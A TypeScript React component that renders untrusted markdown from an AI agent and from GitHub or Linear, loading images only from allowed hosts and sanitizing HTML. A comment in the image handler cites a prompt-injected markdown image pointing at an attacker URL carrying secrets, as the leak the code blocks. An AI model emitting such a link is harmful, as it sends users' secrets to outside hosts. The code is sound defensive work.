import { type ComponentProps, memo } from "react";
import ReactMarkdown, { type Components, defaultUrlTransform } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import { TICKET_MEDIA_PATH } from "../../src/shared/tickets";
import { remarkFilePaths, textFilePath } from "../file-paths";
import { FileLink } from "./file-link";

/** Where text written on GitHub may load images from. The page's CSP allows the same hosts. */
const GITHUB_IMAGE_PREFIXES = [
	"https://avatars.githubusercontent.com/",
	"https://github.com/user-attachments/",
	"https://private-user-images.githubusercontent.com/",
	"https://user-images.githubusercontent.com/",
];

const INLINE_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/i;

const inlineImage = (src: string): boolean => INLINE_IMAGE.test(src);
/** A file of a Linear issue, which this server fetches from Linear: the issue's markdown names it so. */
const ticketMedia = (src: string): boolean => src.startsWith(`${TICKET_MEDIA_PATH}?`);
const githubImage = (src: string): boolean => inlineImage(src) || ticketMedia(src) || GITHUB_IMAGE_PREFIXES.some(prefix => src.startsWith(prefix));

/**
 * An image that loads only from where `allowed` says. Any other would be fetched the moment the text renders, so a
 * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead.
 */
const imageFrom =
	(allowed: (src: string) => boolean): Components["img"] =>
	({ node: _node, ...props }: ComponentProps<"img"> & { node?: unknown }) => {
		const { src, alt } = props;
		if (typeof src !== "string" || src === "") return <>{alt}</>;
		if (allowed(src)) return <img {...props} />;
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{alt || src}
			</a>
		);
	};

const link: Components["a"] = ({ children, node: _node, ...props }) => (
	<a {...props} target="_blank" rel="noopener noreferrer">
		{children}
	</a>
);

/** A video that plays only a Linear issue's file; any other source shows as a link to it. */
const video: Components["video"] = ({ node: _node, src }) => {
	if (typeof src !== "string" || src === "") return null;
	if (!ticketMedia(src)) {
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{src}
			</a>
		);
	}
	return (
		<video controls preload="metadata" src={src} className="max-h-[70vh] w-full rounded-md bg-black">
			<a href={src} target="_blank" rel="noopener noreferrer">
				Download the video
			</a>
		</video>
	);
};

/** A link in agent text: a text file's path opens in the file dialog, anything else in a new tab. */
const agentLink: Components["a"] = ({ href, children, node: _node, ...props }) => {
	const path = href === undefined ? null : textFilePath(href);
	return path === null ? (
		<a {...props} href={href} target="_blank" rel="noopener noreferrer">
			{children}
		</a>
	) : (
		<FileLink path={path}>{children}</FileLink>
	);
};

const AGENT_COMPONENTS: Components = { a: agentLink, img: imageFrom(inlineImage) };
const GITHUB_COMPONENTS: Components = { a: link, img: imageFrom(githubImage), video };

/** GitHub's schema, plus the `<video>` a Linear issue's recording becomes. */
const SANITIZE_SCHEMA = {
	...defaultSchema,
	tagNames: [...(defaultSchema.tagNames ?? []), "video"],
	attributes: { ...defaultSchema.attributes, video: ["src"] },
};

const AGENT_PLUGINS = [rehypeHighlight];
const GITHUB_PLUGINS = [rehypeRaw, [rehypeSanitize, SANITIZE_SCHEMA], rehypeHighlight] satisfies ComponentProps<typeof ReactMarkdown>["rehypePlugins"];
const REMARK_PLUGINS = [remarkGfm];
const AGENT_REMARK_PLUGINS = [remarkGfm, remarkFilePaths];

/**
 * react-markdown drops `data:` URLs; the images the page allows inline are the exception. A `file://` link keeps its
 * path, which the file dialog opens.
 */
const urlTransform = (url: string, key: string): string => {
	if (key === "src" && inlineImage(url)) return url;
	if (key === "href" && url.startsWith("file:///")) return decodeURI(url.slice("file://".length));
	return defaultUrlTransform(url);
};

/**
 * Markdown text is untrusted. react-markdown escapes raw HTML and filters unsafe link schemes. Images load only inline
 * (`data:`), or, for `github`, from GitHub's own hosts and from this server's route for a Linear issue's files, which
 * also plays its videos. `github`: text written on GitHub or Linear, whose raw HTML renders as GitHub renders it,
 * through rehype-sanitize's schema, which follows GitHub's; HTML comments drop out, as GitHub hides them. In agent
 * text, the path of a text file opens it in the file dialog, a relative one against `FileBaseContext`.
 *
 * Parsing and highlighting a long reply is the page's costliest render, so the same text never renders twice.
 */
export const MessageMarkdown = memo(function MessageMarkdown({ text, github = false }: { text: string; github?: boolean }) {
	return (
		<div className="message-markdown whitespace-normal break-words">
			<ReactMarkdown
				remarkPlugins={github ? REMARK_PLUGINS : AGENT_REMARK_PLUGINS}
				rehypePlugins={github ? GITHUB_PLUGINS : AGENT_PLUGINS}
				components={github ? GITHUB_COMPONENTS : AGENT_COMPONENTS}
				urlTransform={urlTransform}
			>
				{text}
			</ReactMarkdown>
		</div>
	);
});
